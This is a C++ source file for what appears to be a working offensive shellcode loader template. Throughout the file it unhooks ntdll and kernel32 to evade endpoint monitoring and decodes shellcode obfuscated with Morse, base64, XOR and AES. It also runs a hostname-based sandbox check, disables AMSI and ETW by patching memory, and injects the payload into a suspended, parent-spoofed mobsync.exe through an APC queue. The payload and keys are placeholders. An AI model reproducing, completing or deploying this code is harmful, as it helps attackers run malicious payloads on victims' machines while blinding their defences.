#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>
#include <psapi.h>
#include <vector>
#include "aes.hpp"
#include "base64.h"
#include "low.h"
#include <string>
#include <map>
#include <sstream>
#include <numeric>

typedef BOOL(WINAPI* VirtualProtect_t)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef HANDLE(WINAPI* CreateFileMappingA_t)(HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCSTR);
typedef LPVOID(WINAPI* MapViewOfFile_t)(HANDLE, DWORD, DWORD, DWORD, SIZE_T);
typedef BOOL(WINAPI* UnmapViewOfFile_t)(LPCVOID);
VirtualProtect_t VirtualProtect_p = NULL;

using namespace std;

map< char, string > ascii_to_morse =
{
{'a',".-"},{'A',"^.-"},{'b',"-..."},{'B',"^-..."},{'c',"-.-."},{'C',"^-.-."},{'d',"-.."},{'D',"^-.."},{'e',"."},{'E',"^."},{'f',"..-."},{'F',"^..-."},{'g',"--."},{'G',"^--."},{'h',"...."},{'H',"^...."},{'i',".."},{'I',"^.."},{'j',".---"},{'J',"^.---"},{'k',"-.-"},{'K',"^-.-"},{'l',".-.."},{'L',"^.-.."},{'m',"--"},{'M',"^--"},{'n',"-."},{'N',"^-."},{'o',"---"},{'O',"^---"},{'p',".--."},{'P',"^.--."},{'q',"--.-"},{'Q',"^--.-"},{'r',".-."},{'R',"^.-."},{'s',"..."},{'S',"^..."},{'t',"-"},{'T',"^-"},{'u',"..-"},{'U',"^..-"},{'v',"...-"},{'V',"^...-"},{'w',".--"},{'W',"^.--"},{'x',"-..-"},{'X',"^-..-"},{'y',"-.--"},{'Y',"^-.--"},{'z',"--.."},{'Z',"^--.."},{'0',"-----"},{'1',".----"},{'2',"..---"},{'3',"...--"},{'4',"....-"},{'5',"....."},{'6',"-...."},{'7',"--..."},{'8',"---.."},{'9',"----."},{'/',"/"},{'=',"...^-"},{'+',"^.^"},{'!',"^..^"},{'.',"^^^.__-"},
};

void tokenize(std::string const& str, const char delim,
    std::vector<std::string>& out)
{
    // construct a stream from the string 
    std::stringstream ss(str);

    std::string s;
    while (std::getline(ss, s, delim)) {
        out.push_back(s);
    }
}

string translate_morse(string morsed)
{
    string translated;

    //morse to ascii
    std::vector<std::string> lines;
    tokenize(morsed, ' ', lines);
    for (int s = 0; s < lines.size(); s++) {
        for (auto it = ascii_to_morse.rbegin(); it != ascii_to_morse.rend(); it++) {
            if (lines[s] == it->second)
            {
                translated.push_back(it->first);
            }
        }
    }
    return translated;
}

// This is just directly stolen from ired.team
DWORD get_PPID() {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 process = { 0 };
    process.dwSize = sizeof(process);

    if (Process32First(snapshot, &process)) {
        do {
            if (!wcscmp(process.szExeFile, L"explorer.exe"))
                break;
        } while (Process32Next(snapshot, &process));
    }

    CloseHandle(snapshot);
    return process.th32ProcessID;
}

//code stolen from https://github.com/Hagrid29/RemotePatcher/blob/main/RemotePatcher/RemotePatcher.cpp
void patchAMSI(OUT HANDLE& hProc) {

    LPSTR s = const_cast<char*>(translate_morse(".- -- ... .. ^^^.__- -.. .-.. .-..").c_str());
    LPSTR l = const_cast<char*>(translate_morse("^.- -- ... .. ^... -.-. .- -. ^-... ..- ..-. ..-. . .-.").c_str());
    void* amsiAddr = GetProcAddress(LoadLibraryA(s), l);

    char amsiPatch[] = { 0x31, 0xC0, 0x05, 0x4E, 0xFE, 0xFD, 0x7D, 0x05, 0x09, 0x02, 0x09, 0x02, 0xC3 };

    DWORD lpflOldProtect = 0;
    unsigned __int64 memPage = 0x1000;
    void* amsiAddr_bk = amsiAddr;


    NtProtectVirtualMemory(hProc, (PVOID*)&amsiAddr_bk, (PSIZE_T)&memPage, 0x04, &lpflOldProtect);
    NtWriteVirtualMemory(hProc, (LPVOID)amsiAddr, (PVOID)amsiPatch, sizeof(amsiPatch), (SIZE_T*)nullptr);
    NtProtectVirtualMemory(hProc, (PVOID*)&amsiAddr_bk, (PSIZE_T)&memPage, lpflOldProtect, &lpflOldProtect);
    //std::cout << "[+] Patched amsi!\n";
}

//code stolen from https://github.com/Hagrid29/RemotePatcher/blob/main/RemotePatcher/RemotePatcher.cpp
void patchAMSIOpenSession(OUT HANDLE& hProc) {

    LPSTR s = const_cast<char*>(translate_morse(".- -- ... .. ^^^.__- -.. .-.. .-..").c_str());
    LPSTR l = const_cast<char*>(translate_morse("^.- -- ... .. ^--- .--. . -. ^... . ... ... .. --- -.").c_str());
    void* amsiAddr = GetProcAddress(LoadLibraryA(s), l);

    char amsiPatch[] = { 0x48, 0x31, 0xC0 };

    DWORD lpflOldProtect = 0;
    unsigned __int64 memPage = 0x1000;
    void* amsiAddr_bk = amsiAddr;


    NtProtectVirtualMemory(hProc, (PVOID*)&amsiAddr_bk, (PSIZE_T)&memPage, 0x04, &lpflOldProtect);
    NtWriteVirtualMemory(hProc, (LPVOID)amsiAddr, (PVOID)amsiPatch, sizeof(amsiPatch), (SIZE_T*)nullptr);
    NtProtectVirtualMemory(hProc, (PVOID*)&amsiAddr_bk, (PSIZE_T)&memPage, lpflOldProtect, &lpflOldProtect);
    //std::cout << "[+] Patched amsi open session!\n";
}

//code stolen from https://github.com/Hagrid29/RemotePatcher/blob/main/RemotePatcher/RemotePatcher.cpp
void patchETW(OUT HANDLE& hProc) {
    LPSTR s = const_cast<char*>(translate_morse("-. - -.. .-.. .-.. ^^^.__- -.. .-.. .-..").c_str());
    LPSTR l = const_cast<char*>(translate_morse("^ . - .-- ^ . ... - . - . - ^ .-- . - . .. - .").c_str());
    void* etwAddr = GetProcAddress(GetModuleHandle((LPCTSTR)s), l);

    char etwPatch[] = { 0xC3 };

    DWORD lpflOldProtect = 0;
    unsigned __int64 memPage = 0x1000;
    void* etwAddr_bk = etwAddr;
    NtProtectVirtualMemory(hProc, (PVOID*)&etwAddr_bk, (PSIZE_T)&memPage, 0x04, &lpflOldProtect);
    NtWriteVirtualMemory(hProc, (LPVOID)etwAddr, (PVOID)etwPatch, sizeof(etwPatch), (SIZE_T*)nullptr);
    NtProtectVirtualMemory(hProc, (PVOID*)&etwAddr_bk, (PSIZE_T)&memPage, lpflOldProtect, &lpflOldProtect);
    //std::cout << "[+] Patched etw!\n";

}

//reffered to alaris
void howlow_sc(std::vector<byte> recovered)
{
    STARTUPINFOEXA si;
    PROCESS_INFORMATION pi;
    LPVOID mem;
    HANDLE hProcess, hThread;
    DWORD pid;
    DWORD bytesWritten;
    PULONG dwOld = 0;

    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    SIZE_T size = 0;

    // Initialize custom startup objects for CreateProcess()
    si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
    si.StartupInfo.dwFlags = EXTENDED_STARTUPINFO_PRESENT;
    InitializeProcThreadAttributeList(NULL, 2, 0, &size);
    si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, size);

    // Disallow non-microsoft signed DLL's from hooking/injecting into our CreateProcess():
InitializeProcThreadAttributeList(si.lpAttributeList, 2, 0, &size);
DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &policy, sizeof(policy), NULL, NULL);

// Mask the PPID to that of explorer.exe
HANDLE explorer_handle = OpenProcess(PROCESS_ALL_ACCESS, false, get_PPID());
UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &explorer_handle, sizeof(HANDLE), NULL, NULL);

LPCWSTR hollow_bin = L"C:\\Windows\\System32\\mobsync.exe";

if (!CreateProcess(
    hollow_bin,			// LPCWSTR Command (Binary to Execute)
    NULL,				// Command line
    NULL,				// Process handle not inheritable
    NULL,				// Thread handle not inheritable
    FALSE,				// Set handle inheritance to FALSE
    EXTENDED_STARTUPINFO_PRESENT
    | CREATE_NO_WINDOW
    | CREATE_SUSPENDED,	// Creation Flags
    NULL,				// Use parent's environment block
    NULL,				// Use parent's starting directory 
    (LPSTARTUPINFOW)&si,// Pointer to STARTUPINFO structure
    &pi					// Pointer to PROCESS_INFORMATION structure (removed extra parentheses)
)) {
    DWORD errval = GetLastError();
    std::cout << "whoops " << errval << std::endl;
}

WaitForSingleObject(pi.hProcess, 1400);
hProcess = pi.hProcess;
hThread = pi.hThread;

mem = nullptr;
SIZE_T p_size = recovered.size();

//patch AMSI and ETW before anything else
patchAMSI(hProcess);
patchAMSIOpenSession(hProcess);
patchETW(hProcess);

NtAllocateVirtualMemory(hProcess, &mem, 0, (PSIZE_T)&p_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
//std::cout << "Written to " << mem << std::endl;
NtWriteVirtualMemory(hProcess, mem, recovered.data(), recovered.size(), 0);
// will be implemented soon
// VirtualProtect(mem, (size_t)p_size, 0x20, MEM_COMMIT | MEM_RESERVE);
//NtProtectVirtualMemory(hProcess, mem , (PSIZE_T)&p_size, PAGE_EXECUTE_READ, dwOld);
NtQueueApcThread(hThread, (PKNORMAL_ROUTINE)mem, mem, NULL, NULL);
NtResumeThread(hThread, NULL);

// Overwrite shellcode with null bytes
Sleep(9999);
uint8_t overwrite[500];
NtWriteVirtualMemory(hProcess, mem, overwrite, sizeof(overwrite), 0);
}

std::string XOR(std::string decoded, std::string xorKey)
{
    char x0rek3y[19];
    for (int k = 0; k < xorKey.length(); k++) x0rek3y[k] = xorKey[k];

    int j = 0;
    for (int i = 0; i < decoded.size(); i++) {
        if (j == sizeof x0rek3y - 1) j = 0;

        decoded[i] = decoded[i] ^ x0rek3y[j];
        j++;
    }
    return decoded;
}

void unhook(char* modulePath, char* oriModulePath, const char* moduleName, HANDLE process) {
    MODULEINFO mi = {};
    HMODULE ntdllModule = GetModuleHandleA(moduleName);
    lstrcatA(modulePath, moduleName);

    GetModuleInformation(process, ntdllModule, &mi, sizeof(mi));
    LPVOID ntdllBase = (LPVOID)mi.lpBaseOfDll;
    HANDLE ntdllFile = CreateFileA(modulePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    HANDLE ntdllMapping = CreateFileMapping(ntdllFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    LPVOID ntdllMappingAddress = MapViewOfFile(ntdllMapping, FILE_MAP_READ, 0, 0, 0);

    PIMAGE_DOS_HEADER hookedDosHeader = (PIMAGE_DOS_HEADER)ntdllBase;
    PIMAGE_NT_HEADERS hookedNtHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)ntdllBase + hookedDosHeader->e_lfanew);

    //cout << "[REFRESH] Copying PE sections into memory " << modulePath << endl;
    for (WORD i = 0; i < hookedNtHeader->FileHeader.NumberOfSections; i++) {
        PIMAGE_SECTION_HEADER hookedSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(hookedNtHeader) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));

        if (!strcmp((char*)hookedSectionHeader->Name, (char*)".text")) {
            DWORD oldProtection = 0;
            bool isProtected = VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtection);
            memcpy((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), (LPVOID)((DWORD_PTR)ntdllMappingAddress + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize);
            isProtected = VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, oldProtection, &oldProtection);
        }
    }

    // this would still require a PE relocation but will do this later
    // ----
    // Step 3: Calculate relocations
    // ----
    // refer here https://github.com/rsmudge/unhook-bof/blob/master/src/refresh.c

    memset(modulePath, 0, strlen(modulePath));
    memcpy(modulePath, oriModulePath, strlen(oriModulePath));
    CloseHandle(process);
    CloseHandle(ntdllFile);
    CloseHandle(ntdllMapping);
    FreeLibrary(ntdllModule);
}

//code stolen from https://github.com/D1rkMtr/DumpThatLSASS/blob/main/MiniDump/Source.cpp
static int UnhookModule(const HMODULE hDbghelp, const LPVOID pMapping) {
    /*
        UnhookDbghelp() finds .text segment of fresh loaded copy of Dbghelp.dll and copies over the hooked one
    */
    DWORD oldprotect = 0;
    PIMAGE_DOS_HEADER pidh = (PIMAGE_DOS_HEADER)pMapping;
    PIMAGE_NT_HEADERS pinhpinh = (PIMAGE_NT_HEADERS)((DWORD_PTR)pMapping + pidh->e_lfanew);
    int i;


    // find .text section
    for (i = 0; i < pinhpinh->FileHeader.NumberOfSections; i++) {
        PIMAGE_SECTION_HEADER pishpish = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(pinhpinh) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));

        if (!strcmp((char*)pishpish->Name, ".text")) {
            // prepare hDbghelp.dll memory region for write permissions.
            VirtualProtect_p((LPVOID)((DWORD_PTR)hDbghelp + (DWORD_PTR)pishpish->VirtualAddress), pishpish->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldprotect);
            if (!oldprotect) {
                // RWX failed!
                return -1;
            }
            // copy original .text section into hDbghelp memory
            memcpy((LPVOID)((DWORD_PTR)hDbghelp + (DWORD_PTR)pishpish->VirtualAddress), (LPVOID)((DWORD_PTR)pMapping + (DWORD_PTR)pishpish->VirtualAddress), pishpish->Misc.VirtualSize);

            // restore original protection settings of hDbghelp
            VirtualProtect_p((LPVOID)((DWORD_PTR)hDbghelp + (DWORD_PTR)pishpish->VirtualAddress), pishpish->Misc.VirtualSize, oldprotect, &oldprotect);
            if (!oldprotect) {
                // it failed
                return -1;
            }
            // all is good, time to go home
            return 0;
        }
    }
    // .text section not found?
    return -1;
}

//code stolen from https://github.com/D1rkMtr/DumpThatLSASS/blob/main/MiniDump/Source.cpp
void FreshCopy(unsigned char* sKernel32, unsigned char* modulePath, unsigned char* moduleName) {
    unsigned char sCreateFileMappingA[] = { 'C','r','e','a','t','e','F','i','l','e','M','a','p','p','i','n','g','A', 0x0 };
    unsigned char sMapViewOfFile[] = { 'M','a','p','V','i','e','w','O','f','F','i','l','e',0x0 };
    unsigned char sUnmapViewOfFile[] = { 'U','n','m','a','p','V','i','e','w','O','f','F','i','l','e', 0x0 };
    unsigned char sVirtualProtect[] = { 'V','i','r','t','u','a','l','P','r','o','t','e','c','t', 0x0 };

    int ret = 0;
    HANDLE hFile;
    HANDLE hFileMapping;
    LPVOID pMapping;

    CreateFileMappingA_t CreateFileMappingA_p = (CreateFileMappingA_t)GetProcAddress(GetModuleHandleA((LPCSTR)sKernel32), (LPCSTR)sCreateFileMappingA);
    MapViewOfFile_t MapViewOfFile_p = (MapViewOfFile_t)GetProcAddress(GetModuleHandleA((LPCSTR)sKernel32), (LPCSTR)sMapViewOfFile);
    UnmapViewOfFile_t UnmapViewOfFile_p = (UnmapViewOfFile_t)GetProcAddress(GetModuleHandleA((LPCSTR)sKernel32), (LPCSTR)sUnmapViewOfFile);
    VirtualProtect_p = (VirtualProtect_t)GetProcAddress(GetModuleHandleA((LPCSTR)sKernel32), (LPCSTR)sVirtualProtect);

    // open the DLL
    hFile = CreateFileA((LPCSTR)modulePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        // failed to open the DLL
        printf("%u", GetLastError());
    }

    // prepare file mapping
    hFileMapping = CreateFileMappingA_p(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    if (!hFileMapping) {
        // file mapping failed

        CloseHandle(hFile);
        printf("%u", GetLastError());
    }

    // map the bastard
    pMapping = MapViewOfFile_p(hFileMapping, FILE_MAP_READ, 0, 0, 0);
    if (!pMapping) {
        // mapping failed
        CloseHandle(hFileMapping);
        CloseHandle(hFile);
        printf("%u", GetLastError());
    }

    // remove hooks
    ret = UnhookModule(GetModuleHandleA((LPCSTR)moduleName), pMapping);

    // Clean up.
    UnmapViewOfFile_p(pMapping);
    CloseHandle(hFileMapping);
    CloseHandle(hFile);
}

int main()
{
    //unhook all dlls
    HANDLE process = GetCurrentProcess();
    //char fullModulePath[21];
    //char modulePath[] = { 'c',':','\\','w','i','n','d','o','w','s','\\','s','y','s','t','e','m','3','2','\\',0 };
    //memcpy(fullModulePath, modulePath, strlen(modulePath));

    //unhook(fullModulePath, modulePath, "ntdll.dll", process);
    //unhook(fullModulePath, modulePath, "kernel32.dll", process);

    unsigned char sNtdllPath[] = { 'C',':','\\','W','i','n','d','o','w','s','\\','S','y','s','t','e','m','3','2','\\','n','t','d','l','l','.','d','l','l',0 };
    unsigned char sKernel32Path[] = { 'C',':','\\','W','i','n','d','o','w','s','\\','S','y','s','t','e','m','3','2','\\','k','e','r','n','e','l','3','2','.','d','l','l',0 };
    unsigned char sKernel32[] = { 'k','e','r','n','e','l','3','2','.','d','l','l', 0x0 };
    unsigned char sNtdll[] = { 'n','t','d','l','l','.','d','l','l', 0x0 };

    FreshCopy(sKernel32, sNtdllPath, sNtdll);
    FreshCopy(sKernel32, sKernel32Path, sKernel32);

    // Disallow non-MSFT signed DLL's from injecting
    PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY sp = {};
    sp.MicrosoftSignedOnly = 1;
    SetProcessMitigationPolicy(ProcessSignaturePolicy, &sp, sizeof(sp));

    std::vector<uint8_t> ciphertext, recovered;
    BOOL hugeCode = REPLACEBOOLVALUE;
    std::string morsed, sh3llc0de, decoded, b64a3skey, b64a3siv, morsedb64a3skey, morsedb64a3siv, morsedxorKey, xorKey;
    base64 b64 = base64();

    //xor
    morsed = "REPLACE SHELLCODE HERE";
    morsedb64a3skey = "REPLACE A3S_KEY";
    morsedb64a3siv = "REPLACE A3S_IV";
    morsedxorKey = "REPLACE XORKEY";

    //translate all sumarine language
    sh3llc0de = translate_morse(morsed);
    b64a3skey = translate_morse(morsedb64a3skey);
    b64a3siv = translate_morse(morsedb64a3siv);
    xorKey = translate_morse(morsedxorKey);

    // sandbox check
    string strHostname;
    char name[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(name);
    GetComputerNameA(name, &size);

    for (char character : name) strHostname.push_back(character);
    if (strHostname.find("CHANGESTRINGHERE") != std::string::npos) {
        //std::cout << "hit" << std::endl;
        xorKey.replace(0, 1, "~");
    }

    /*
    if (strcmp(name, "DESKTOP-H39OG3S") == 0) {
        std::cout << "Sandbox hit" << std::endl;
        xorKey.replace(0, 1, "P");
    }
    */

    decoded = b64.base64_decode(sh3llc0de);

    //xor is already in its own function
    //char x0rek3y[] = "Sup3rS3cur3K3yfTw!";
    //initialize xorKey in a weird way
    /*
    char x0rek3y[19];
    for (int k = 0; k < xorKey.length(); k++) x0rek3y[k] = xorKey[k];

    int j = 0;
    for (int i = 0; i < decoded.size(); i++) {
        if (j == sizeof x0rek3y - 1) j = 0;

        decoded[i] = decoded[i] ^ x0rek3y[j];
        j++;
    }
    */
    decoded = XOR(decoded, xorKey);

    if (!hugeCode)
    {
        ciphertext.clear();
        std::copy(decoded.begin(), decoded.end(), std::back_inserter(ciphertext));

        // AES Decryption Objects
        struct AES_ctx e_ctx;
        uint8_t key[32];
        uint8_t iv[16];
        string a3s_key = b64.base64_decode(b64a3skey);
        string a3s_iv = b64.base64_decode(b64a3siv);
        std::copy(a3s_key.begin(), a3s_key.end(), std::begin(key));
        std::copy(a3s_iv.begin(), a3s_iv.end(), std::begin(iv));

        AES_init_ctx_iv(&e_ctx, key, iv);

        // DECRYPT
        struct AES_ctx d_ctx;
        AES_init_ctx_iv(&d_ctx, key, iv);
        AES_CBC_decrypt_buffer(&d_ctx, ciphertext.data(), ciphertext.size());
        recovered.clear();

        // Remove the padding from the decypted plaintext
        SIZE_T c_size = ciphertext.size();
        for (int i = 0; i < c_size; i++)
        {
            if (ciphertext[i] == 0x90 && i == (c_size - 1))
            {
                break;
            }
            else if (ciphertext[i] == 0x90 && ciphertext[i + 1] == 0x90)
            {
                break;
            }
            else
            {
                recovered.push_back(ciphertext[i]);
            }
        }
    }
    else
    {
        recovered.clear();
        std::copy(decoded.begin(), decoded.end(), std::back_inserter(recovered));
    }

    //process hollowing + ppid spoofing
    howlow_sc(recovered);
}

